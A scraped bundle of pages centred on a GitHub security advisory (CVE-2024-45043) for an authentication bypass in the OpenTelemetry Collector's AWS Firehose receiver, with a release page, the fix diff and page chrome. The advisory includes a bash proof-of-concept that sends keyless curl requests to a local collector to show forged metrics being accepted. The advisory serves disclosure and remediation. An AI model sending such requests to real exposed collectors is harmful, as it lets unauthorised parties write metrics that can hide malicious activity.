![Warning](https://d1ge0kk1l5kms0.cloudfront.net/images/G/01/webservices/console/warning.png) **Javascript is disabled or is unavailable in your browser.**

To use the Amazon Web Services Documentation, Javascript must be enabled. Please refer to your browser's Help pages for instructions.

[Document Conventions](/general/latest/gr/docconventions.html)Data ProtectionAuthenticate with
AWS Secrets ManagerDid this page help you? - Yes

Thanks for letting us know we're doing a good job!

If you've got a moment, please tell us what we did right so we can do more of it.

Did this page help you? - No

Thanks for letting us know this page needs work. We're sorry we let you down.

If you've got a moment, please tell us how we can make the documentation better.



=== Content from github.com_c9bd2dec_20250111_082356.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Freleases%2Ftag%2Fv0.108.0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-releases%2Freleases%2Ftag%2Fv0.108.0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector-releases)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector-releases](/open-telemetry/opentelemetry-collector-releases)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases) You must be signed in to change notification settings
* [Fork
  165](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases)
* [Star
   267](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-releases)

* [Code](/open-telemetry/opentelemetry-collector-releases/tree/v0.108.0)
* [Issues
  56](/open-telemetry/opentelemetry-collector-releases/issues)
* [Pull requests
  12](/open-telemetry/opentelemetry-collector-releases/pulls)
* [Actions](/open-telemetry/opentelemetry-collector-releases/actions)
* [Projects
  0](/open-telemetry/opentelemetry-collector-releases/projects)
* [Security](/open-telemetry/opentelemetry-collector-releases/security)
* [Insights](/open-telemetry/opentelemetry-collector-releases/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector-releases/tree/v0.108.0)
* [Issues](/open-telemetry/opentelemetry-collector-releases/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector-releases/pulls)
* [Actions](/open-telemetry/opentelemetry-collector-releases/actions)
* [Projects](/open-telemetry/opentelemetry-collector-releases/projects)
* [Security](/open-telemetry/opentelemetry-collector-releases/security)
* [Insights](/open-telemetry/opentelemetry-collector-releases/pulse)

1. [Releases](/open-telemetry/opentelemetry-collector-releases/releases)
2. [v0.108.0](/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0)

# v0.108.0

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/open-telemetry/opentelemetry-collector-releases/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.108.0)

 Loading

[View all tags](/open-telemetry/opentelemetry-collector-releases/tags)

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)
released this
27 Aug 22:22

·
[85 commits](/open-telemetry/opentelemetry-collector-releases/compare/v0.108.0...main)
to main
since this release

[v0.108.0](/open-telemetry/opentelemetry-collector-releases/tree/v0.108.0)

This tag was signed with the committer’s **verified signature**.

[![](https://avatars.githubusercontent.com/u/223565?s=64&v=4)](/codeboten)
[codeboten](/codeboten)
Alex Boten

GPG key ID: B6C3966DEDD376B5

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

[`bef563e`](/open-telemetry/opentelemetry-collector-releases/commit/bef563ebb0f3a73fb8681d4ca4178ddf244042b6)

This commit was created on GitHub.com and signed with GitHub’s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

Check the [v0.108.0 contrib changelog](https://github.com/open-telemetry/opentelemetry-collector-contrib/releases/tag/v0.108.0) and the [v0.108.0 core changelog](https://github.com/open-telemetry/opentelemetry-collector/releases/tag/v0.108.0) for changelogs on specific components.

## Changelog

* [bef563e](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/bef563ebb0f3a73fb8681d4ca4178ddf244042b6) [chore] prepare v0.108.0 release ([#650](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/650))
* [9f7aa60](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/9f7aa60ccb871bab6e5ad76e3a4c4a31e7f25370) contrib: add deltatocumulative ([#647](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/647))
* [d86f03d](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/d86f03d6116e1753adc4ff1ab1f327d19263226d) Bump anchore/sbom-action from 0.17.1 to 0.17.2 ([#648](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/648))
* [ae09f1c](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/ae09f1c95ff57be3507678da85fb9ddac8eb540e) add geoip processor to contrib ([#646](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/646))
* [cd82e6f](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/cd82e6fd703ac4733ab8800d177d08452de990e6) Remove ballast extension ([#607](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/607))
* [2bafff8](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/2bafff863f53630ba01b0cb809e1dac965b492eb) Bump docker/setup-buildx-action from 3.5.0 to 3.6.1 ([#628](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/628))
* [45130cf](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/45130cf417eea3228a299d92a44165b1198282cd) Bump anchore/sbom-action from 0.17.0 to 0.17.1 ([#644](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/644))
* [5bbfb51](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/5bbfb51ebc9861b72c40476f9ecda8a9ed0bca92) Bump github.com/goreleaser/goreleaser-pro/v2 from 2.1.0-pro to 2.2.0-pro ([#645](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/645))
* [fbe9653](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/fbe96534081a5ea85bc16ccd558f96cd24658c9f) Bump to Go 1.23 for all builds ([#638](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/638))
* [9c8c699](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/9c8c699de1a756c7b99a1188f8db68bb6540116e) Update .goreleaser.yml ([#643](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/643))
* [de92512](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/de92512197c429960163d486b55825ef778a1761) Jackgopack4/go1.23 ci fix ([#641](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/641))
* [4c7310f](https://github.com/open-telemetry/opentelemetry-collector-releases/commit/4c7310fe699387ea5cce55f393a6ac806339165e) Fix goreleaser ci ([#640](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/640))

 Assets
383

 Loading

 🎉
2
 0xfeeddeadbeef and swamisriman reacted with hooray emoji

All reactions

* 🎉
  2 reactions

 2 people reacted

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ac07d01b_20250111_082354.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Fsecurity%2Fadvisories%2FGHSA-prf6-xjxh-p698)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Fsecurity%2Fadvisories%2FGHSA-prf6-xjxh-p698)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector-contrib)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector-contrib](/open-telemetry/opentelemetry-collector-contrib)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib)
* [Star
   3.2k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib)

* [Code](/open-telemetry/opentelemetry-collector-contrib)
* [Issues
  748](/open-telemetry/opentelemetry-collector-contrib/issues)
* [Pull requests
  145](/open-telemetry/opentelemetry-collector-contrib/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector-contrib/discussions)
* [Actions](/open-telemetry/opentelemetry-collector-contrib/actions)
* [Projects
  0](/open-telemetry/opentelemetry-collector-contrib/projects)
* [Security](/open-telemetry/opentelemetry-collector-contrib/security)
* [Insights](/open-telemetry/opentelemetry-collector-contrib/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector-contrib)
* [Issues](/open-telemetry/opentelemetry-collector-contrib/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector-contrib/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector-contrib/discussions)
* [Actions](/open-telemetry/opentelemetry-collector-contrib/actions)
* [Projects](/open-telemetry/opentelemetry-collector-contrib/projects)
* [Security](/open-telemetry/opentelemetry-collector-contrib/security)
* [Insights](/open-telemetry/opentelemetry-collector-contrib/pulse)

# AWS Firehose Receiver Authentication Bypass Vulnerability

Moderate

[arminru](/arminru)
published
GHSA-prf6-xjxh-p698
Aug 28, 2024

## Package

gomod

github.com/open-telemetry/opentelemetry-collector-contrib/receiver/awsfirehosereceiver
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

>= 0.49.0, < 0.108.0

## Patched versions

0.108.0

## Description

### Summary

OpenTelemetry Collector module [`awsfirehosereceiver`](https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/receiver/awsfirehosereceiver) allows unauthenticated remote requests, even when configured to require a key.

OpenTelemetry Collector can be configured to receive CloudWatch metrics via an AWS Firehose Stream. [Firehose sets the header](https://docs.aws.amazon.com/firehose/latest/dev/httpdeliveryrequestresponse.html) `X-Amz-Firehose-Access-Key` with an arbitrary configured string. The OpenTelemetry Collector awsfirehosereceiver can optionally be configured to require this key on incoming requests. However, when this is configured it **still accepts incoming requests with no key**.

### Impact

Only OpenTelemetry Collector users configured with the “[alpha](https://github.com/open-telemetry/opentelemetry-collector#alpha)” `awsfirehosereceiver` module are affected. This module was [added](https://github.com/open-telemetry/opentelemetry-collector-releases/pull/74) in version v0.49.0 of the [“Contrib” distribution](https://github.com/open-telemetry/opentelemetry-collector-releases/tree/main/distributions/otelcol-contrib) (or may be included in custom builds).

There is a risk of unauthorized users writing metrics. Carefully crafted metrics could hide other malicious activity. There is no risk of exfiltrating data. It’s likely these endpoints will be exposed to the public internet, as Firehose [does not support private HTTP endpoints](https://docs.aws.amazon.com/firehose/latest/dev/controlling-access.html#using-iam-http).

### Fix

A fix was introduced in [#34847](https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847) and released with v0.108.0 (<https://github.com/open-telemetry/opentelemetry-collector-releases/releases/tag/v0.108.0>).

### Details

Details
#### PoC

When simulating Firehose requests against vulnerable versions of the Collector, we can see “UNAUTHORIZED METRICS” printed to the console via the debug exporter.

(Note this script doesn’t run on some older still-vulnerable versions that do not have the “debug” exporter.)

```
#!/bin/bash

OTELCOL_VERSION=0.107.0
OTELCOL_BINARY="otelcol-contrib-${OTELCOL_VERSION}"
OTELCOL_PLATFORM="linux_amd64"
HOST_PORT=8081

cat > config.yaml << END
# https://opentelemetry.io/docs/collector/configuration/
exporters:
  debug:
    verbosity: normal
receivers:
  awsfirehose:
    endpoint : "127.0.0.1:${HOST_PORT}"
    record_type : "cwmetrics"
    access_key : "1234"
service:
  pipelines:
    metrics:
      receivers:
      - awsfirehose
      exporters:
      - debug
  telemetry:
    logs:
      encoding: "json"
      level: "debug"
END

if [ ! -x "${OTELCOL_BINARY}" ]; then
    curl --proto '=https' --tlsv1.2 -fOL https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v${OTELCOL_VERSION}/otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz
    tar -xvf otelcol-contrib_${OTELCOL_VERSION}_${OTELCOL_PLATFORM}.tar.gz otelcol-contrib
    mv otelcol-contrib ${OTELCOL_BINARY}
fi

"./${OTELCOL_BINARY}" --config=config.yaml &
OTELCOL_PID=$!

echo "Running OTel Collector with PID ${OTELCOL_PID}"

sleep 3

# Send metrics with correct access key
if ! curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-valid"\
  -H "X-Amz-Firehose-Access-Key: 1234"\
  --data '{"requestId":"requestId-valid","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJSZXF1ZXN0cyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjkuMCwiY291bnQiOjkuMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo "Unexpected – Request with valid access key did not succeed"
    kill ${OTELCOL_PID}
    exit 1
fi

# Send metrics with incorrect access key
if curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-invalid"\
  -H "X-Amz-Firehose-Access-Key: 5678"\
  --data '{"requestId":"requestId-invalid","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo "Unexpected – Request succeeded with invalid access key"
    kill ${OTELCOL_PID}
    exit 1
fi

# Send unauthorized metrics without an access key
if curl --fail \
  -H "Content-Type: application/json"\
  -H "X-Amz-Firehose-Request-Id: requestId-unauthorized"\
  --data '{"requestId":"requestId-unauthorized","timestamp":1723704887152,"records":[{"data":"eyJtZXRyaWNfc3RyZWFtX25hbWUiOiJ0ZXN0IiwiYWNjb3VudF9pZCI6IjEyMzQ1Njc4OSIsInJlZ2lvbiI6InVzLWVhc3QtMSIsIm5hbWVzcGFjZSI6IkFXUy9DbG91ZEZyb250IiwibWV0cmljX25hbWUiOiJVTkFVVEhPUklaRUQgTUVUUklDUyIsImRpbWVuc2lvbnMiOnsiRGlzdHJpYnV0aW9uSWQiOiJBQkNEIiwiUmVnaW9uIjoiR2xvYmFsIn0sInRpbWVzdGFtcCI6MTcyMzcwNDU0MDAwMCwidmFsdWUiOnsibWF4IjoxLjAsIm1pbiI6MS4wLCJzdW0iOjU2NzguMCwiY291bnQiOjU2NzguMH0sInVuaXQiOiJOb25lIn0="}]}'\
  http://127.0.0.1:${HOST_PORT}
then
    echo -e "\n*** Vulnerability present - request with no access key succeeded ***\n"
else
    echo "Not vulnerable - request with no key was denied."
    kill ${OTELCOL_PID}
    exit 1
fi

kill ${OTELCOL_PID}
```
#### Patch

The [`if` statement](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/v0.107.0/receiver/awsfirehosereceiver/receiver.go#L235) makes the access key header optional, rather than the configuration optional.

This has been patched in [#34847](https://github.com/open-telemetry/opentelemetry-collector-contrib/pull/34847) to separately handle the case where access\_key is not configured, and use a default-deny style:

```
diff --git a/receiver/awsfirehosereceiver/receiver.go b/receiver/awsfirehosereceiver/receiver.go
index 6211f61221..4d78eb2778 100644
--- a/receiver/awsfirehosereceiver/receiver.go
+++ b/receiver/awsfirehosereceiver/receiver.go
@@ -233,10 +233,14 @@ func (fmr *firehoseReceiver) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 // validate checks the Firehose access key in the header against
 // the one passed into the Config
 func (fmr *firehoseReceiver) validate(r *http.Request) (int, error) {
-       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey != "" && accessKey != string(fmr.config.AccessKey) {
-               return http.StatusUnauthorized, errInvalidAccessKey
+       if string(fmr.config.AccessKey) == "" {
+               // No access key is configured - accept all requests.
+               return http.StatusAccepted, nil
+       }
+       if accessKey := r.Header.Get(headerFirehoseAccessKey); accessKey == string(fmr.config.AccessKey) {
+               return http.StatusAccepted, nil
        }
-       return http.StatusAccepted, nil
+       return http.StatusUnauthorized, errInvalidAccessKey
 }

diff --git a/receiver/awsfirehosereceiver/receiver_test.go b/receiver/awsfirehosereceiver/receiver_test.go
index b02a391dd5..1ef5bdf4d3 100644
--- a/receiver/awsfirehosereceiver/receiver_test.go
+++ b/receiver/awsfirehosereceiver/receiver_test.go
@@ -123,6 +123,14 @@ func TestFirehoseRequest(t *testing.T) {
                        wantStatusCode: http.StatusUnauthorized,
                        wantErr:        errInvalidAccessKey,
                },
+               "WithNoAccessKey": {
+                       headers: map[string]string{
+                               headerFirehoseAccessKey: "",
+                       },
+                       body:           testFirehoseRequest(testFirehoseRequestID, noRecords),
+                       wantStatusCode: http.StatusUnauthorized,
+                       wantErr:        errInvalidAccessKey,
+               },
                "WithoutRequestId/Body": {
                        headers: map[string]string{
                                headerFirehoseRequestID: testFirehoseRequestID,

```

### Severity

Moderate

5.3

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
Low

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N

### CVE ID

CVE-2024-45043

### Weaknesses

No CWEs

### Credits

* [![@DouglasHeriot](https://avatars.githubusercontent.com/u/238401?s=40&v=4)](/DouglasHeriot)
  [DouglasHeriot](/DouglasHeriot)
  Reporter
* [![@Aneurysm9](https://avatars.githubusercontent.com/u/473616?s=40&v=4)](/Aneurysm9)
  [Aneurysm9](/Aneurysm9)
  Remediation reviewer
* [![@arminru](https://avatars.githubusercontent.com/u/7052238?s=40&v=4)](/arminru)
  [arminru](/arminru)
  Coordinator

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c876ffac_20250111_082353.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Fpull%2F34847)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Fpull%2F34847)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector-contrib)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

